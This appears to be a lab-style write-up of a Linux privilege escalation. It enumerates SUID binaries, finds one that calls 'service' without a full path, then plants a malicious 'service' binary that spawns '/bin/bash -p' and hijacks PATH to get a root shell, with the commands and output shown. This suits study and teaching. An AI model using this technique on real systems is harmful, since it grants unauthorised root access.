---
author(s):
  - Userware
tags:
  - post-exploitation
  - privilege-escalation
  - living-off-the-land
  - linux
---
# Living off the Land

## 01 - Enumerate

It describes itself that it derives from the user's PATH environment variable and to to run the programs that doesn't require to specify and absolute path that can be exploited.

```
user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
```

When the program it seems it's gonna start a apache2 webserver

```
$ /usr/local/bin/suid-env
Starting web server: apache2httpd (pid 1656) already running
.
```

We use the `strings` command to look any readable functions that we can analyze.

```
user@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

This is the main problem here the `service apache2` start works but the point was it was not specified the full path. This is where the `$PATH` bash predefined variable for the shell environment that is useful for this situation.

## 02 - Exploit

We will compile our own version of `service.c` and re-define the `$PATH` variable.

```
user@debian:~$ cat > service.c << EOF
#include <stdlib.h>
#include <unistd.h>

int main() {
        setuid(0);
        system("/bin/bash -p");
}
EOF
user@debian:~$ gcc -o service service.c
user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
root@debian:~# whoami && id
root
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

## 03 - Cleanup

```
root@debian:~# exit
user@debian:~$ rm service service.c
```